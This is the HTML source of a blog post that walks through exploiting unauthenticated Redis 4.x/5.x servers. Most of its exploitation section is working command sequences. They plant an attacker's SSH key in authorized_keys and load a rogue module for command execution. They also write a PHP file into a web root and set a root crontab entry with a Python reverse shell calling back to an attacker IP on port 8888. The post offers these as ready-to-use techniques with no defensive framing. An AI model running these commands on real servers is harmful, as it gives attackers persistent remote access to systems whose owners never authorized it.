<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Redis 4.x /5.x Unauthenticated Exploit</title>

  <link rel="stylesheet" href="/css/main.css">
  
</head>

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1>xinyue@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive"><h2 class="header-link">Archive</h2></a>
<a href="/about"><h2 class="header-link">About</h2></a>
    </div>
  </div>
</header>
    <div class="container">
      <section id="main_content">
        <article>
  <h2>Redis 4.x /5.x Unauthenticated Exploit</h2>
  <time datetime="2024-06-23T00:00:00-07:00" class="by-line">23 Jun 2024</time>
  <h1 id="overview">Overview</h1>

<p>Redis is an open source, in-memory data structure store that acts as a database, cache, and message broker. It’s often used to speed up web applications by caching frequently accessed information in memory. The default port is 6379/tcp. There are three types of authentication: no credentials by default, password only, username:password. Redis versions 4.x / 5.x are vulnerable to the execution of arbitrary commands. Redis is often placed in internal network, so if it is an old version and exposed in public network without password protection, then it would be a disaster, but there are still many exposed Redis servers in real word. Attackers are able to get remote execution on redis through various methods. Here are some techniques for exploitation.</p>

<h1 id="exploitation">Exploitation</h1>

<p>A common command-line tool for interacting with Redis is <code class="language-plaintext highlighter-rouge">redis-cli</code></p>

<p>Install command:<code class="language-plaintext highlighter-rouge">sudo apt-get install redis-tools</code></p>

<h2 id="ssh">SSH</h2>

<p>If we know a valid username or redis directory path, and target has ssh service open, we can write public key to file and then ssh to target.</p>

<p>https://github.com/iw00tr00t/Redis-Server-Exploit/tree/master</p>

<p>Exploit manually:</p>

<ol>
  <li>We first generate an ssh key pair.</li>
  <li>Then write to the file. Note that <code class="language-plaintext highlighter-rouge">\n\n</code> is needed here for split keys</li>
  <li>Import public key to server by setting value</li>
  <li>
    <p>Get user’s ssh path with command <code class="language-plaintext highlighter-rouge">config get dir</code> and set dir to ssh directory</p>

    <p>Common directories are <code class="language-plaintext highlighter-rouge">/var/lib/redis/.ssh</code>  <code class="language-plaintext highlighter-rouge">/root/.ssh</code> <code class="language-plaintext highlighter-rouge">/home/redis/.ssh</code></p>
  </li>
  <li>Save and ssh to target with private key.</li>
</ol>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span> <span class="nx">ssh</span><span class="o">-</span><span class="nx">keygen</span> <span class="o">-</span><span class="nx">t</span> <span class="nx">rsa</span>
<span class="nx">$</span> <span class="p">(</span><span class="nx">echo</span> <span class="o">-</span><span class="nx">e</span> <span class="dl">"</span><span class="se">\n\n</span><span class="dl">"</span><span class="p">;</span> <span class="nx">cat</span> <span class="nx">id_rsa</span><span class="p">.</span><span class="nx">pub</span><span class="p">;</span> <span class="nx">echo</span> <span class="o">-</span><span class="nx">e</span> <span class="dl">"</span><span class="se">\n\n</span><span class="dl">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">pub</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">$</span> <span class="nx">cat</span> <span class="nx">pub</span><span class="p">.</span><span class="nx">txt</span> <span class="o">|</span> <span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="o">&lt;</span><span class="nx">IP</span><span class="o">&gt;</span> <span class="o">-</span><span class="nx">x</span> <span class="kd">set</span> <span class="nx">ssh_key</span>
<span class="nx">$</span> <span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="o">&lt;</span><span class="nx">IP</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="nx">config</span> <span class="kd">set</span> <span class="nx">dir</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/lib/</span><span class="nx">redis</span><span class="o">/</span><span class="p">.</span><span class="nx">ssh</span>
<span class="nx">OK</span>
<span class="o">&gt;</span> <span class="nx">config</span> <span class="kd">set</span> <span class="nx">dbfilename</span> <span class="dl">"</span><span class="s2">authorized_keys</span><span class="dl">"</span>
<span class="nx">OK</span>
<span class="o">&gt;</span> <span class="nx">save</span>
<span class="nx">OK</span>
</code></pre></div></div>

<h2 id="compile-redis-module">Compile Redis Module</h2>

<p>First we compile an exec module and then load this module when interacting with redis. We can execute arbitrary command and get reverse shell on target. This exploit has been tested on Redis 5.0.9 and works perfectly.</p>

<blockquote>
  <p>https://github.com/vulhub/redis-rogue-getshell</p>

</blockquote>

<p>A full explanation of the command exec module can be found here.</p>

<blockquote>
  <p>https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</p>

</blockquote>

<p><img src="../assets/images/Redis-4.x-5.x-Unauthenticated-Exploit/screenshot.png" alt="" /></p>

<h2 id="php-webshell">PHP Webshell</h2>

<p>We can also upload webshell if we know web server’s path. Then we access <code class="language-plaintext highlighter-rouge">http://&lt;IP&gt;/phpinfo.php</code></p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="mf">10.85</span><span class="p">.</span><span class="mf">0.52</span>
<span class="o">&gt;</span> <span class="nx">config</span> <span class="kd">set</span> <span class="nx">dir</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">nginx</span><span class="o">/</span><span class="nx">html</span>
<span class="c1">// &gt; config set dir /var/www/html</span>
<span class="nx">OK</span>
<span class="o">&gt;</span> <span class="nx">config</span> <span class="kd">set</span> <span class="nx">dbfilename</span> <span class="nx">phpinfo</span><span class="p">.</span><span class="nx">php</span>
<span class="nx">OK</span>
<span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">test</span> <span class="dl">"</span><span class="s2">&lt;?php phpinfo(); ?&gt;</span><span class="dl">"</span>
<span class="nx">OK</span>
<span class="o">&gt;</span> <span class="nx">save</span>
<span class="nx">OK</span>
</code></pre></div></div>

<h2 id="crontab">Crontab</h2>

<p>We can write reverse shell payload to crontabs. Payloads can be found here. <code class="language-plaintext highlighter-rouge">https://www.revshells.com/</code></p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span> <span class="nx">echo</span> <span class="o">-</span><span class="nx">e</span> <span class="dl">"</span><span class="se">\n\n</span><span class="s2">*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\"</span><span class="s2">10.85.0.53</span><span class="se">\"</span><span class="s2">,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">-i</span><span class="se">\"</span><span class="s2">]);'</span><span class="se">\n\n</span><span class="dl">"</span><span class="o">|</span><span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="o">&lt;</span><span class="nx">IP</span><span class="o">&gt;</span> <span class="o">-</span><span class="nx">x</span> <span class="kd">set</span> <span class="mi">1</span>
<span class="nx">OK</span>
<span class="nx">$</span> <span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="o">&lt;</span><span class="nx">IP</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="nx">config</span> <span class="kd">set</span> <span class="nx">dir</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/spool/</span><span class="nx">cron</span><span class="o">/</span><span class="nx">crontabs</span><span class="o">/</span>
<span class="c1">// /var/spool/cron/ for centos</span>
<span class="nx">OK</span>
<span class="o">&gt;</span> <span class="nx">config</span> <span class="kd">set</span> <span class="nx">dbfilename</span> <span class="nx">root</span>
<span class="nx">OK</span>
<span class="o">&gt;</span> <span class="nx">save</span>
<span class="nx">OK</span>
</code></pre></div></div>

</article>
      </section>
    </div>
  </div>

   <footer>
  <a href="https://xxxinhy.github.io/">
    <span>
        <b>Xinyue</b>
    </span>
    
    <span>© 2024</span>
  </a>
</footer>

  
</body>

</html>